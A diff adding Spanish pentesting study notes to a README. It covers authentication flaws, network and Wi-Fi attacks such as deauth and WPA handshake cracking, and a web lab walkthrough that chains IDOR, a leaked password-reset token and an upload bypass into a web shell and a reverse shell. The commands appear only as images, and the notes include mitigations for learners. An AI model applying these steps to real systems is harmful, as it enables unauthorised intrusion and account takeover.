+    <p>&nbsp; Las autenticaciones rotas (Broken Authentication) es una categoría de vulnerabilidad web que se refiere a debilidades en los mecanismos de autenticación y gestión de sesiones de una aplicación. </p>
+  </br>
+      <p><b> 🛠 A traves de sesiones de ID en URLs &nbsp; </b> Es una práctica de desarrollo insegura donde el identificador de sesión del usuario se expone como parámetro en la URL en lugar de transmitirse de manera segura a través de cookies HTTPOnly o cabeceras.</p>
+      <p><b> 🛠 Explotacion de contraseñas </b> se pueden identificar contraseñas almacenadas en bases de datos. Debido al uso de algoritmos de hashing débiles y a través de la explotación del tiempo de espera. Si una aplicación tiene configurado un tiempo de espera largo para la expiración de las sesiones. </p>
+      <p><b> 🛠 Explotacion del tiempo de espera </b> Si una aplicación tiene configurado un tiempo de espera largo para la expiración de las sesiones. Cuando un usuario cierra el navegador sin cerrar la sesión de los sitios a los que ha accedido desde un computador público. Un atacante podría usar el mismo navegador para producir un ataque you que los ID de sesión pueden seguir siendo válidos. Por lo que puede explotar los privilegios del usuario </p>
+
+
+  <p>&nbsp; 3) &nbsp; Cross-site scripting (XSS) </p>     
+
+  </br>
+    <p>&nbsp; Es una vulnerabilidad web que permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios. Es una de las vulnerabilidades más prevalentes y peligrosas en aplicaciones web. </p>
+  </br>
+
+
+  <p>&nbsp; 4) &nbsp; Cross-site scripting (XSS) </p>     
+
+  </br>
+    <p>&nbsp; Es una vulnerabilidad web que permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios. Es una de las vulnerabilidades más prevalentes y peligrosas en aplicaciones web. </p>
+  </br>
+
+
+
+
+
+<p> ----------------------------------- Pendiente actualizar con el OWASP TOP 10 2025------------------------------------------</p>
+
+
+
+<p>&nbsp;&nbsp;<h3>Ataques de red pasivos vs. activos<h3></p>
+
+
+### 👨🏻‍💻 &nbsp; Ataques pasivos
+
+
+<p> implican la monitorización o interceptación del tráfico de red sin alterar ni interferir con los datos transmitidos. El objetivo principal es recopilar información sobre la red o sus usuarios </p>
+
+<p><b>&nbsp;&nbsp;&nbsp; • Network Sniffing</b> Captura y análisis de paquetes de datos a medida que viajan a través de la red para extraer información útil. </p>
+<p><b>&nbsp;&nbsp;&nbsp; • Análisis de tráfico</b> Observación de patrones y volúmenes de tráfico para inferir información sensible, como los hábitos de comunicación de 
+los usuarios o la estructura de la red.</p>
+
+<p> En los ataques pasivos, el atacante pasa desapercibido, ya que no modifica ni interrumpe el tráfico de la red, como si se espiara una conversación. 
+"Cuanto más silencioso te vuelves, más puedes oír." - Ram Dass</p>
+
+
+### 🛠 &nbsp;Herramientas
+
+</br>
+
+<p><b> • Above :</b> Identifica los protocolos en uso en una red y cualquier vulnerabilidad obvia.</p>
+<p><b> • Pcredz :</b> Identifica y extrae información confidencial del tráfico de red.</p>
+<p><b> • Wireshark :</b> La herramienta de rastreo y análisis de paquetes. Si no la conoces, familiarízate con ella</p>
+<p><b> • tcpdump :</b> Herramienta de captura de paquetes de línea de comandos. </p>
+<p><b> • Kismet  :</b> Rastreador pasivo para varias redes inalámbricas (Wi-Fi, Bluetooth, etc.).</p>
+
+
+
+### 👨🏻‍💻 &nbsp; Ataques de red activos
+
+</br>
+
+### &nbsp; Tipos de ataque
+
+</br>
+
+<p> Implican la modificación, interrupción o manipulación deliberada del tráfico o las comunicaciones de la red para lograr objetivos maliciosos. </p>
+
+
+
+
+
+
+### &nbsp;Vulnerabilidades y las explotaciones basados en la red
+
+
+<p> • Ataques y explotaciones basados en la resolución de nombres de Windows</p>
+<p> • Ataque de envenenamiento de caché DNS</p>
+<p> • Ataques y explotaciones contra implementaciones de Server Message Block (SMB)</p>
+<p> • Vulnerabilidades y explotaciones del Protocolo simple de administración de red (SNMP)</p>
+<p> • Vulnerabilidades y explotaciones del Protocolo simple de transferencia de correo (SMTP)</p>
+<p> • Vulnerabilidades y explotaciones del Protocolo de transferencia de archivos (FTP)</p>
+<p> • Ataques de transferencia de hash</p>
+<p> • Ataques en ruta (antes conocidos como ataques de intermediario [MITM])</p>
+<p> • Ataques de eliminación de SSL</p>
+<p> • Ataques de denegación de servicio (DoS) y de denegación de servicio distribuido (DDoS)</p>
+<p> • Omisión del control de acceso a la red (NAC)</p>
+<p> • Ataques de salto a la red de área local virtual (VLAN)</p>
+
+### &nbsp;Ataques a redes WI-FI
+
+### &nbsp;Ataques contra WEP
+
+</br>
+
+<p> WEP es susceptible a muchos ataques diferentes, se considera un protocolo inalámbrico obsoleto. ha sido derrotado durante décadas. WEP usa RC4 de una manera que permite a un atacante 
+descifrar la PSK con poco esfuerzo. El problema está relacionado con cómo WEP utiliza los IV en cada paquete. Cuando WEP usa RC4 para cifrar un paquete, anteponga el IV a la clave secreta 
+antes de incluir la clave en RC4. Posteriormente, un atacante tiene los primeros 3 bytes de una clave supuestamente “secreta” utilizada en cada paquete. Para recuperar el PSK, el atacante 
+solo necesita recopilar suficientes datos del aire. Un atacante puede acelerar este tipo de ataque inyectando paquetes ARP (porque la longitud es predecible), lo que permite que el atacante 
+recupere el PSK mucho más rápido. Después de recuperar la clave WEP, el atacante puede usarla para acceder a la red inalámbrica.</p>
+
+### &nbsp;Ataques contra WPA
+
+</br>
+
+<p> Todas las versiones de WPA admiten diferentes métodos de autenticación, incluido PSK. WPA no es susceptible a los ataques IV que afectan a WEP; Sin embargo, es posible capturar el protocolo 
+de enlace de cuatro vías WPA entre un cliente y un dispositivo de infraestructura inalámbrica y luego aplicar la fuerza bruta a la PSK de WPA.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/DZhK6SGF/1.png" alt="Descripción de la imagen">
+</p>
+
+<p><b>&nbsp;&nbsp;&nbsp; • Paso 1. </b> Un atacante monitorea la red Wi-Fi y encuentra clientes inalámbricos conectados al SSID de la red corporativa. </p>
+<p><b>&nbsp;&nbsp;&nbsp; • Paso 2. </b> El atacante envía paquetes DeAuth para desautenticar al cliente inalámbrico. </p>
+<p><b>&nbsp;&nbsp;&nbsp; • Paso 3. </b> El atacante captura el protocolo de enlace de cuatro vías WPA y descifra la PSK de WPA. (Es posible usar listas de palabras y herramientas como Aircrack-ng para realizar este ataque. </p>
+
+
+### &nbsp;Vulnerabilidades que afectan a WPA y WPA2
+
+### &nbsp;&nbsp; Estas vulnerabilidades, también denominadas KRACK (ataque de reinstalación de claves ) (https://www.krackattacks.com/)
+
+
+
+<!-------------------------------------------------- Ejemplo explotacion Pentest web --------------------------------------------------------------------------->
+
+
+
+
+<h2> :arrow_right: Pentest WEB</h2> 
+
+
+<p> Claves del compromiso </p>
+
+
+
+<p> :radio_button: La enumeración permite mapear la estructura, los encabezados, los puntos finales y el comportamiento de la aplicación antes de intentar la explotación. </p>
+
+<p> :radio_button: Los pequeños defectos se encadenan en grandes compromisos. Ningún tema aquí fue exótico o particularmente complejo. IDOR, restablecimientos débiles de contraseñas y omisiones en la carga son vulnerabilidades bien entendidas. Su impacto provino de cómo se conectaron entre sí. </p>
+
+<p>  :radio_button:  Las restricciones del lado del cliente no son seguridad. El formulario de carga de archivos utilizaba un accept atributo para restringir los tipos de archivos en el navegador. La verificación del lado del servidor utilizó una lista de bloqueo que omitió la alternativa extensiones PHP . La seguridad real requiere una validación del lado del servidor con un enfoque de lista de permisos. </p>
+
+<p> :radio_button: Los mecanismos de restablecimiento de contraseña merecen una atención cuidadosa. Son complejos de implementar de forma segura, y una sola falla de diseño, como exponer el token en la respuesta, puede llevar a la apropiación de la cuenta. </p>
+
+
+<p> :radio_button: Piense como un atacante, informe como un consultor. Encontrar las vulnerabilidades es la mitad del trabajo. Documentarlos claramente con calificaciones de gravedad y consejos de remediación viables es lo que hace que el compromiso sea valioso para el cliente.  </p>
+
+
+
+
+<h2> white_check_mark: 1.  Reconocimiento y enumeracion </h2> 
+
+
+
+<p> Recopilar la mayor cantidad de informacion posible sobre el objetivo</p> 
+
+
+<p> 1. Escaneo de puertos </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/50HWSMRT/285.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Resultado puertos abiertos</p> 
+
+<p> Puerto 22: SSH Util si obtenemos credenciales  </p> 
+<p> Puerto 80: Donde se encuentra la aplicacionn WEB la cual se esta ejecutando en apache </p> 
+<p> Puerto 3306: Indica que usa una base de datos MySQL en el Backend</p> 
+<p> Puerto 8080: página predeterminada de Apache la aplicación probablemente construye consultas SQL y cualquier debilidad en el manejo de entradas podría generar problemas relacionados con SQL </p> 
+
+
+<p> 2. Explorando la aplicacion </p> 
+
+<p> Validar el encabezados HTTP  </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/jqwRzzVQ/287.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Resultado puertos abiertos</p> 
+
+
+<p> Los encabezados confirman que el servidor se está ejecutando apache con versión2.4.58 . LaPHPSESSID cookie confirma que la gestión de sesiones PHP está en uso. Ahora conocemos la pila de tecnología: Apache + PHP + MySQL, una configuración LAMP clásica.</p> 
+
+
+<p> 3. Enumeracion de directorios </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wvRnsQtt/286.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Resultado</p>
+
+
+<p> /admin- Existe un panel de administración, pero redirecciona a la página de inicio de sesión. Necesitaremos credenciales para acceder a él  </p> 
+<p> /api-  Las API a menudo exponen datos de maneras que el frontend no lo hace.</p> 
+<p> /reset.php- Una página de restablecimiento de contraseña. Los mecanismos de reinicio con frecuencia se implementan de forma insegura.</p> 
+<p> /uploads- Un directorio de cargas. Si podemos cargar archivos, esta podría ser una ruta para la ejecución del código. </p> 
+<p> /profile.php y/dashboard.php - Estos requieren autenticación, por lo que debemos iniciar sesión para acceder a ellos.</p> 
+
+
+<p> 4. Explorando API </p> 
+
+<p> El API enumera de forma útil sus propios puntos finales. Este ya es un problema de divulgación de información en una aplicación de producción; un usuario no autenticado no debería poder descubrir información interna rutas API.</p> 
+
+
+
+<p align="center">
+
+  <img src="hhttps://i.postimg.cc/tC8Z3XmY/288.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+
+<h2> white_check_mark:  IDOR (Insecure Direct Object Reference) </h2> 
+
+
+<p> Es un tipo de vulnerabilidad común en pruebas de penetración donde un atacante puede acceder directamente a objetos o recursos del sistema sin autenticación ni autorización adecuadas. </p> 
+
+
+<p> En una prueba de penetración, se identifica IDOR al observar cómo la aplicación maneja referencias a objetos (como IDs de usuarios, archivos o recursos). Los escenarios típicos incluyen: </p> 
+
+
+<p>&nbsp;1. Acceso no autorizado: Un usuario puede manipular parámetros (por ejemplo, ?id=123) para acceder a datos de otros usuarios. </p> 
+<p>&nbsp;2. Manipulación de recursos: Cambiar IDs para acceder a archivos o rutas que no deberían ser accesibles. </p> 
+<p>&nbsp;3. Desbordamiento de recursos: Acceder a más recursos de los permitidos por el sistema. </p> 
+
+
+<p> Mitigar IDOR </p> 
+
+
+<p> • Validar siempre la relación entre el usuario actual y el recurso solicitado.</p> 
+<p> • Usar referencias indirectas (hashes o tokens) en lugar de IDs directos. </p> 
+<p> • Implementar controles de acceso estrictos en todos los puntos de entrada. </p> 
+
+<p> IDOR es especialmente peligroso porque puede permitir el acceso no autorizado a información sensible o funcionalidades críticas. </p> 
+
+
+
+<h3> Probar si una pagina web es vulnerable a IDOR</h3> 
+
+
+<p>&nbsp;1. Identificar parámetros de objeto en URLs (como ?id=, ?user_id=, ?file=). </p> 
+<p>&nbsp;2. Extraccion de Cookies </p> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HsBq38Qz/283.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>&nbsp;3. Usar CURL para que ver exactamente qué regresa. Asegúrese de incluir su cookie de sesión en el siguiente comando después del PHPSESSID= valor: </p> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/BQzRR81K/284.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h2> white_check_mark: 3. Restablecimiento de contraseña debil </h2> 
+
+
+<p> Los flujos de restablecimiento de contraseña son una de las características que se rompen con más frecuencia en las aplicaciones web porque son complejos de implementar de forma segura y los desarrolladores a menudo toman atajos.</p> 
+
+
+
+<p>  En una aplicación diseñada adecuadamente, el token de reinicio se enviaría al correo electrónico del usuario y nunca se mostraría en la pantalla. Pero esta aplicación muestra el token directamente en la respuesta.</p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3rknYFVm/289.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>  Ahora tenemos todo lo que necesitamos. Usemos el token para restablecer la contraseña de Sarah Mitchell. Visite la URL de reinicio y le pedirá una nueva contraseña:</p> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/BQzRR81K/284.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Fallas en la pagina WEB.</p> 
+
+
+<p> <b> Token mostrado en respuesta: </b>  El token solo debe enviarse al correo electrónico del propietario de la cuenta, nunca debe mostrarse en la pantalla. </p> 
+<p> <b> Generación de tokens débil:  </b> un token numérico de seis dígitos tiene un espacio de claves pequeño y es susceptible a ataques de fuerza bruta. </p> 
+<p> <b> Sin limitación de velocidad: </b> la aplicación no limitó la cantidad de solicitudes de reinicio ni conjeturas de tokens. </p> 
+
+
+
+<h2> white_check_mark: 4. Acceso al panel de administracion </h2> 
+
+
+<p> Una función de carga de archivos en manos de un administrador es una característica poderosa y, desde la perspectiva de un evaluador de penetración, es un camino potencial hacia la ejecución remota de código. </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nz0YpCYT/291.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Examinemos la página de carga. Haga clic derecho en el botón y Upload haga clic en Inspect </p> 
+
+
+
+<p> Podemos notar varios detalles importantes. El formulario dice que acepta archivos PDF, DOCX y de imagen. El atributo enaccept la entrada del archivo restringe los tipos de archivos, pero esta es solo una restricción del lado del cliente. El navegador lo aplica, pero una solicitud HTTP directa puede enviar cualquier tipo de archivo que desee. La página también revela el destino de carga: . /uploads/documents/  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3wZ2FdqS/293.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5NFvkPGN/294.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h2> white_check_mark: 5. Ejecucion remota de codigo </h2> 
+
+
+<p> • Creación de un shell web </p> 
+
+<p> Un shell web es un pequeño script que acepta comandos a través de parámetros HTTP y los ejecuta en el servidor.  </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pTBKPD1H/297.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> • Ejecución de comandos </p> 
+
+<p> Verifiquemos que tenemos ejecución de código ejecutando comandos simples:  </p> 
+<p> Lectura de archivos confidenciales. </p> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/SQ77yfFx/295.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> • Obtención de un Reverse Shell </p> 
+
+
+
+
+<!-------------------------------------------------- Fase 4 Post Explotacion --------------------------------------------------------------------------->
+
+
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=50&pause=1000&color=F7608A&width=700&height=600&lines=Fase+3.+Explotacion" alt="Typing SVGxxxxx" /></a></summary>
+  </ul>
+</div>
+
+
+
+
+<h2> :arrow_right: Escalada de privilegios </h2>
+
+
+<h2> :white_check_mark: &nbsp; Obtener acceso - Initial Access &nbsp; TA0001</h2>
+
+
+<p> El adversario está intentando entrar en tu red. </p>
+
+
+
+<p> El acceso inicial consiste en técnicas que utilizan varios vectores de entrada para obtener su punto de apoyo inicial dentro de una red. Las técnicas utilizadas para afianzarse incluyen el phishing selectivo y la explotación de debilidades en servidores web públicos. Los puntos de acceso obtenidos a través del acceso inicial pueden permitir el acceso continuo, como cuentas válidas y el uso de servicios remotos externos, o pueden tener un uso limitado debido al cambio de contraseñas. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wjq7hnBW/305.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+
+
+<!-------------------------------------------------- Fase 5 Informe --------------------------------------------------------------------------->
+
+
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=50&pause=1000&color=F7608A&width=700&height=600&lines=Fase+3.+Explotacion" alt="Typing SVGxxxxx" /></a></summary>
+  </ul>
+</div>
+
+
+
+<p> • Recomendaciones del contenido de un informe</p>
+
+
+<p> • Una portada con un título, su nombre, dirección de correo electrónico y control de versiones.</p>
+<p> • Una tabla de contenidos (opcional).</p>
+<p> • Un resumen ejecutivo, dirigido al gerente que solicitó el compromiso, explicando lo logrado en términos no técnicos.</p>
+<p> • Un resumen técnico dirigido al gerente de ingeniería, para que comprenda el impacto y pueda priorizar en consecuencia (Opcional).</p>
+<p> • Una tabla de todas las vulnerabilidades encontradas, ordenadas por gravedad, dirigida a gerentes e ingenieros, nuevamente para priorizar en consecuencia.</p>
+<p> • Sección de explotación detallada, donde se explica cada vulnerabilidad y su impacto, se muestran los pasos de explotación y las pruebas, y se dan recomendaciones para mitigaciones. Esto está dirigido a ingenieros que remediarán sus hallazgos.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+>>>>>>> main
